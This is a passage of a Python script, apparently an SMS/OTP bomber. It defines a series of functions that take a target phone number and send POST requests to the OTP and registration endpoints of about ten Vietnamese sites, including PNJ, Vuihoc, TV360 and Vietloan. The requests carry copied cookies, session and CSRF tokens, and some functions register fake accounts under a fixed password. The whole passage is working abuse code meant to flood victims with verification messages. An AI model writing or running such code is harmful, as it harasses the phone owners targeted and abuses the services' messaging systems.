_ga_K1CDGBJEK0=GS1.1.1723111895.1.0.1723111897.0.0.0; _pk_id.564990245.4a15=1576926415.1723111894.1.1723111898.1723111894.; _gcl_aw=GCL.1723111898.CjwKCAjw2dG1BhB4EiwA998cqH9UrhNb3v3mY6CCTprx6uvWZVeth2J_-cOPdltAn2NoHqAoivhahxoCU2UQAvD_BwE; _gcl_gs=2.1.k1$i1723111897; _ga_3S12QVTD78=GS1.1.1723111894.1.1.1723111898.56.0.0; _ac_client_id=1576926415.1723111899; _asm_ss_view=%7B%22time%22%3A1723111894293%2C%22sid%22%3A%222263478188876597%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222024-08-08T10%3A11%3A38%22%2C%22duration%22%3A3835%7D; _ac_an_session=zhzhzlzgznzkzrzizrzrzrzkzlzmzqzkzdzizmzkzlzqzhzlznzizmzdzizkzhzgzizizizrzqzqzdzizdzizkzhzgzizizizrzqzqzdzizkzhzgzizizizrzqzqzdzizdzhzqzdzizd2f27zdzgzdzlzmzlznzizdzd3226z82q2524z835242725z82q242h2k; _ga=GA1.3.1212797956.1723111895; _ga_TN4J88TP5X=GS1.3.1723111895.1.1.1723111898.57.0.0; _clsk=1bm8lg6%7C1723111898553%7C2%7C1%7Cz.clarity.ms%2Fcollect; XSRF-TOKEN=eyJpdiI6ImlQZ25ERGdRK2hsQXU1cC9Ib3cxN3c9PSIsInZhbHVlIjoiNWl3aWZVNm0yTUFnVi9qYjIzNFg3aU1rK28veXVBcjYvSXoxbTMxbGYydHRSNGV5a2hMYnJNdk1zT3NDamZLMXc2cEthbFhMU3NmOFhtRjNiRElmR2tuczFJY3M4VURJV0l2ZWpqSkpQYmQ4VFpSUzJKOStMWERXQkloVWJuZGwiLCJtYWMiOiI4NDQwOTc5YWFkNGZmZmQ0YjJiMDFiOWE4ZDM0OGY1MGU1MzhhNzNjMWNkNjJmYjQ1ZWExZmUzZjhkNmZjMTMwIiwidGFnIjoiIn0%3D; mypnj_session=eyJpdiI6ImtPYWtRWWhiWnJzWXFTQUNkalFBNmc9PSIsInZhbHVlIjoiQ1REUlhCWWJnTmdiM0dneEpxeDZKbmJZUU9SU1NFRkpjM3QyVTc1RWMvSDI3TVRlamh3YnhMKzJRNUZJdlhmRzBHbHVmWC9nNE4wSk9lODRia3h2VEV2MUYzOVRIalZ6SWFacStCVEQxdlJYODl5V2hKa2VCaCtLVkY4dDNVNnYiLCJtYWMiOiJiYTc4YzY1YjFiM2Q2YTRlNzYzY2Q4YjhlMDlhNDgyYzdmMGQxNDRkNDFlZTM4NWZjNGU0NmI1NTYwOGEzZWM3IiwidGFnIjoiIn0%3D; _ga_FR6G8QLYZ1=GS1.1.1723111894.1.1.1723111916.0.0.0',
    'origin': 'https://www.pnj.com.vn',
    'priority': 'u=0, i',
    'referer': 'https://www.pnj.com.vn/customer/login',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   data = {
    '_method': 'POST',
    '_token': 'GJ88Vp9AuWodl7DpZqr4G8yVCY6JmQs43AvGHOaw',
    'type': 'sms',
    'phone': phone,
}
   headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': '_cdp_user_new; _atm_objs=eyJzb3VyY2UiOiJvcG1fbm91c2Ffc2hvcHBpbmdfYWRzIiwibWVkaXVtIjoiY3BjIiwiY2FtcGFp%0D%0AZ24iOiJwbWF4LWdvbGQiLCJjb250ZW50IjoiIiwidGVybSI6IiIsInR5cGUiOiJhc3NvY2lhdGVf%0D%0AdXRtIiwiY2hlY2tzdW0iOiIqIiwidGltZSI6MTcyMzExMTg5NDIwNH0%3D; _pk_ref.564990245.4a15=%5B%22pmax-gold%22%2C%22%22%2C1723111894%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.564990245.4a15=*; CDPI_VISITOR_ID=264b424c-578a-4265-ae0e-73e7f9c445b6; CDPI_RETURN=New; CDPI_SESSION_ID=1f30e4f5-9ecd-43a9-8f3c-136fd23973a8; _cdp_fsid=2263478188876597; _asm_visitor_type=n; au_id=1576926415; _ac_au_gt=1723111895585; _cdp_cfg=1; _gcl_au=1.1.263099741.1723111894; cdp_session=1; _asm_uid=1576926415; utm_notifications=%7B%22utm_source%22%3A%22opm_nousa_shopping_ads%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_content%22%3A%22%22%2C%22utm_campaign%22%3A%22pmax-gold%22%2C%22aff_sid%22%3A%22%22%7D; _gid=GA1.3.2016393453.1723111895; _gat_UA-26000195-1=1; mp_version_change=4.3.4.2044; _tt_enable_cookie=1; _ttp=hdximspfCm-okdlIB3O4o3-fLf2; _clck=1s0w1yv%7C2%7Cfo5%7C0%7C1681; sid_customer_1f31a=493f941b60de3dc81fb410d2b9a7554f-C; _gac_UA-26000195-1=1.1723111896.CjwKCAjw2dG1BhB4EiwA998cqH9UrhNb3v3mY6CCTprx6uvWZVeth2J_-cOPdltAn2NoHqAoivhahxoCU2UQAvD_BwE; _ga_K1CDGBJEK0=GS1.1.1723111895.1.0.1723111897.0.0.0; _pk_id.564990245.4a15=1576926415.1723111894.1.1723111898.1723111894.; _gcl_aw=GCL.1723111898.CjwKCAjw2dG1BhB4EiwA998cqH9UrhNb3v3mY6CCTprx6uvWZVeth2J_-cOPdltAn2NoHqAoivhahxoCU2UQAvD_BwE; _gcl_gs=2.1.k1$i1723111897; _ga_3S12QVTD78=GS1.1.1723111894.1.1.1723111898.56.0.0; _ac_client_id=1576926415.1723111899; _asm_ss_view=%7B%22time%22%3A1723111894293%2C%22sid%22%3A%222263478188876597%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222024-08-08T10%3A11%3A38%22%2C%22duration%22%3A3835%7D; _ac_an_session=zhzhzlzgznzkzrzizrzrzrzkzlzmzqzkzdzizmzkzlzqzhzlznzizmzdzizkzhzgzizizizrzqzqzdzizdzizkzhzgzizizizrzqzqzdzizkzhzgzizizizrzqzqzdzizdzhzqzdzizd2f27zdzgzdzlzmzlznzizdzd3226z82q2524z835242725z82q242h2k; _ga=GA1.3.1212797956.1723111895; _ga_TN4J88TP5X=GS1.3.1723111895.1.1.1723111898.57.0.0; _clsk=1bm8lg6%7C1723111898553%7C2%7C1%7Cz.clarity.ms%2Fcollect; XSRF-TOKEN=eyJpdiI6ImlQZ25ERGdRK2hsQXU1cC9Ib3cxN3c9PSIsInZhbHVlIjoiNWl3aWZVNm0yTUFnVi9qYjIzNFg3aU1rK28veXVBcjYvSXoxbTMxbGYydHRSNGV5a2hMYnJNdk1zT3NDamZLMXc2cEthbFhMU3NmOFhtRjNiRElmR2tuczFJY3M4VURJV0l2ZWpqSkpQYmQ4VFpSUzJKOStMWERXQkloVWJuZGwiLCJtYWMiOiI4NDQwOTc5YWFkNGZmZmQ0YjJiMDFiOWE4ZDM0OGY1MGU1MzhhNzNjMWNkNjJmYjQ1ZWExZmUzZjhkNmZjMTMwIiwidGFnIjoiIn0%3D; mypnj_session=eyJpdiI6ImtPYWtRWWhiWnJzWXFTQUNkalFBNmc9PSIsInZhbHVlIjoiQ1REUlhCWWJnTmdiM0dneEpxeDZKbmJZUU9SU1NFRkpjM3QyVTc1RWMvSDI3TVRlamh3YnhMKzJRNUZJdlhmRzBHbHVmWC9nNE4wSk9lODRia3h2VEV2MUYzOVRIalZ6SWFacStCVEQxdlJYODl5V2hKa2VCaCtLVkY4dDNVNnYiLCJtYWMiOiJiYTc4YzY1YjFiM2Q2YTRlNzYzY2Q4YjhlMDlhNDgyYzdmMGQxNDRkNDFlZTM4NWZjNGU0NmI1NTYwOGEzZWM3IiwidGFnIjoiIn0%3D; _ga_FR6G8QLYZ1=GS1.1.1723111894.1.1.1723111916.0.0.0',
    'origin': 'https://www.pnj.com.vn',
    'priority': 'u=0, i',
    'referer': 'https://www.pnj.com.vn/customer/login',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   data = {
    '_method': 'POST',
    '_token': 'GJ88Vp9AuWodl7DpZqr4G8yVCY6JmQs43AvGHOaw',
    'type': 'zalo',
    'phone': phone,
}

   response = requests.post('https://www.pnj.com.vn/customer/otp/request', headers=headers, data=data)
def psc(phone):
   headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://account.pcspost.vn',
    'priority': 'u=1, i',
    'referer': 'https://account.pcspost.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   json_data = {
    'FullName': 'Nguyễn Bảo',
    'EmailOrPhoneNr': phone,
    'NewPassword': 'TheSmartCat2303_',
    'confirmPassword': 'TheSmartCat2303_',
    'StationCode': '89304',
    'Password': 'TheSmartCat2303_',
}
   headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'origin': 'https://account.pcspost.vn',
    'priority': 'u=1, i',
    'referer': 'https://account.pcspost.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   params = {
    'EmailOrPhone': phone,
}

   response = requests.post('https://id.pcs.vn/api/account/mobile-register/POST', headers=headers, json=json_data)
def book365(phone):
   cookies = {
    'PHPSESSID': 'Z7DuIHCNDDfrN3O4LMI8dALGMahbZAoF',
    'BX_USER_ID': 'aecb2878240c52ad76918a710f4c6ff3',
    '_gid': 'GA1.2.1522497530.1723110894',
    '_gat_gtag_UA_163975392_1': '1',
    '_ga_SC10XS66T9': 'GS1.1.1723110894.1.1.1723110987.0.0.0',
    '_ga': 'GA1.1.607258667.1723110894',
}

   headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'PHPSESSID=Z7DuIHCNDDfrN3O4LMI8dALGMahbZAoF; BX_USER_ID=aecb2878240c52ad76918a710f4c6ff3; _gid=GA1.2.1522497530.1723110894; _gat_gtag_UA_163975392_1=1; _ga_SC10XS66T9=GS1.1.1723110894.1.1.1723110987.0.0.0; _ga=GA1.1.607258667.1723110894',
    'origin': 'https://book365.vn',
    'priority': 'u=1, i',
    'referer': 'https://book365.vn/san-sach-in/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

   data = {
    'dangky_name': 'Nguyễn Bảo',
    'dangky_phone': phone,
    'dangky_pwd': 'TheSmartCat2303',
    'dangky_pwdCheck': 'TheSmartCat2303',
    'dangky_country': '0',
    'dangky_province': '0',
    'dangky_district': '0',
    'dangky_award': '0',
    'dangky_address': '',
    'dangky_email': 'asdokljasd@gmail.com',
}

   response = requests.post('https://book365.vn/ajax/dangky_taikhoan.php', cookies=cookies, headers=headers, data=data)
def tatcorp(phone):
   cookies = {
    'sid_customer_6c986': '31ffaec5d2e73191ac7e0584ff32c4f4-C',
    '_ga': 'GA1.1.832929186.1723110682',
    '__zi': '3000.SSZzejyD3Dy_X-YntquEmYQBf_p2003QPTUrzjqIGiXpn_2fcnD3WpR3ywYQ70g5ESgvgPmR38K_ph6g.1',
    '_ga_E7WDYSDL18': 'GS1.1.1723110681.1.1.1723110685.56.0.0',
}

   headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'sid_customer_6c986=31ffaec5d2e73191ac7e0584ff32c4f4-C; _ga=GA1.1.832929186.1723110682; __zi=3000.SSZzejyD3Dy_X-YntquEmYQBf_p2003QPTUrzjqIGiXpn_2fcnD3WpR3ywYQ70g5ESgvgPmR38K_ph6g.1; _ga_E7WDYSDL18=GS1.1.1723110681.1.1.1723110685.56.0.0',
    'origin': 'https://www.tatmart.com',
    'priority': 'u=1, i',
    'referer': 'https://www.tatmart.com/profiles-add/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

   params = {
    'dispatch': 'tat_commons.verifi_phone',
}

   data = {
    'phone': phone,
    'skip_noti': 'true',
    'security_hash': '30c8d654d31afc803c9248dd7db005ec',
    'is_ajax': '1',
}

   response = requests.post('https://www.tatmart.com/index.php', params=params, cookies=cookies, headers=headers, data=data)
def vuihoc(phone):
   cookies = {
    'VERSION': '1',
    'WEB_LOP': '1',
    'duo_theme_json': '{"url_title_trailing_image":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/ico-banh-chung-1x.png","color_background_header_1":"#FFC442","color_background_header_2":"#E1271B","header_live_class":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/live_duo.png","url_bell":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/notification.png","color_background_active":"#FFD476","color_background_hotline":"#FFFFFF","color_text_hotline":"#E1271B","color_text_active":"#E1271B","header_bg_detail_class":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/anh-bia-khoa-hoc.png","holiday_background_animation_type":"tet","holiday_background_animation_cdn":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/cdn-tet-animation.js","start_time":"2024-01-29 00:00:00","end_time":"2024-02-17 00:00:00"}',
    '_gid': 'GA1.2.121155666.1723109800',
    '_gat_UA-133956209-1': '1',
    '_gat_gtag_UA_133956209_1': '1',
    '_ga_PR7QKZ61KC': 'GS1.1.1723109800.1.1.1723109955.42.0.0',
    '_ga': 'GA1.1.1744769498.1723109800',
    '_ga_4BW81DWTX0': 'GS1.1.1723109800.1.1.1723109955.43.0.0',
}

   headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'VERSION=1; WEB_LOP=1; duo_theme_json={"url_title_trailing_image":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/ico-banh-chung-1x.png","color_background_header_1":"#FFC442","color_background_header_2":"#E1271B","header_live_class":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/live_duo.png","url_bell":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/notification.png","color_background_active":"#FFD476","color_background_hotline":"#FFFFFF","color_text_hotline":"#E1271B","color_text_active":"#E1271B","header_bg_detail_class":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/anh-bia-khoa-hoc.png","holiday_background_animation_type":"tet","holiday_background_animation_cdn":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/cdn-tet-animation.js","start_time":"2024-01-29 00:00:00","end_time":"2024-02-17 00:00:00"}; _gid=GA1.2.121155666.1723109800; _gat_UA-133956209-1=1; _gat_gtag_UA_133956209_1=1; _ga_PR7QKZ61KC=GS1.1.1723109800.1.1.1723109955.42.0.0; _ga=GA1.1.1744769498.1723109800; _ga_4BW81DWTX0=GS1.1.1723109800.1.1.1723109955.43.0.0',
    'origin': 'https://vuihoc.vn',
    'priority': 'u=1, i',
    'referer': 'https://vuihoc.vn/user/verifyAccountkitSMS?phone=+84856738291&typeOTP=1',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

   data = {
    'mobile': phone,
}

   response = requests.post('https://vuihoc.vn/service/security/sendOTPSMS', cookies=cookies, headers=headers, data=data)
def vinwonder(phone):
   headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN',
    'content-type': 'application/json; charset=UTF-8',
    'origin': 'https://booking.vinwonders.com',
    'priority': 'u=1, i',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   json_data = {
    'UserName': phone,
    'channel': 10,
}

   response = requests.post(
    'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/check-user',
    headers=headers,
    json=json_data,
)
def mainguyen(phone):
   headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'Connection': 'keep-alive',
    'Origin': 'https://member.mainguyen.vn',
    'Referer': 'https://member.mainguyen.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'content-type': 'application/json',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

   params = {
    'guestKey': 'dde60be3eb3859db4a4f15351134c991',
}

   json_data = {
    'phone': phone,
}

   response = requests.post('https://api.mainguyen.vn/auth/customer/request-otp', params=params, headers=headers, json=json_data)
def giathuoctot(phone):
   headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://giathuoctot.com',
    'priority': 'u=1, i',
    'referer': 'https://giathuoctot.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   json_data = {
    'phoneNo': phone,
}

   response = requests.post('https://api.giathuoctot.com/user/otp', headers=headers, json=json_data)
def tv360(phone):
  data = '{"msisdn":"phone"}'
  data = data.replace("phone",phone)
  head = {
    "Host":"m.tv360.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json"
  }
  rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
#
def robot(phone):
    cookies = {
    '_fbp': 'fb.1.1720102725444.358598086701375218',
    '_gcl_au': '1.1.619229570.1720102726',
    'mousestats_vi': 'acaa606972ae539932c0',
    '_tt_enable_cookie': '1',
    '_ttp': 'tGf0fClVBAWb7n4wsYwyYbdPx5W',
    '_ym_uid': '1720102728534641572',
    '_ym_d': '1720102728',
    '_gid': 'GA1.2.557208002.1720622172',
    '_clck': '14x7a16%7C2%7Cfnc%7C0%7C1646',
    '_ym_isad': '2',
    '__cfruid': '92805d7d62cc6333c3436c959ecc099040706b4f-1720628273',
    '_ym_visorc': 'w',
    'XSRF-TOKEN': 'eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D',
    'sessionid': 'eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D',
    'utm_uid': 'eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D',
    '_ga': 'GA1.2.1882430469.1720102726',
    'ec_png_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_png_client': 'false',
    'ec_png_client_utm': 'null',
    'ec_cache_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_cache_client': 'false',
    'ec_cache_client_utm': 'null',
    'ec_etag_client': 'false',
    'ec_etag_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_etag_client_utm': 'null',
    '_clsk': '1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect',
    '_ga_EBK41LH7H5': 'GS1.1.1720622171.4.1.1720628300.41.0.0',
    'uid': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'client': 'false',
    'client_utm': 'null',
}

    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_fbp=fb.1.1720102725444.358598086701375218; _gcl_au=1.1.619229570.1720102726; mousestats_vi=acaa606972ae539932c0; _tt_enable_cookie=1; _ttp=tGf0fClVBAWb7n4wsYwyYbdPx5W; _ym_uid=1720102728534641572; _ym_d=1720102728; _gid=GA1.2.557208002.1720622172; _clck=14x7a16%7C2%7Cfnc%7C0%7C1646; _ym_isad=2; __cfruid=92805d7d62cc6333c3436c959ecc099040706b4f-1720628273; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D; _ga=GA1.2.1882430469.1720102726; ec_png_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_png_client=false; ec_png_client_utm=null; ec_cache_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_cache_client=false; ec_cache_client_utm=null; ec_etag_client=false; ec_etag_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_etag_client_utm=null; _clsk=1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect; _ga_EBK41LH7H5=GS1.1.1720622171.4.1.1720628300.41.0.0; uid=12044e63-ea79-83c1-269a-86ba3fc88165; client=false; client_utm=null',
    'origin': 'https://vietloan.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://vietloan.vn/register',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phone': phone,
    '_token': '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU',
}

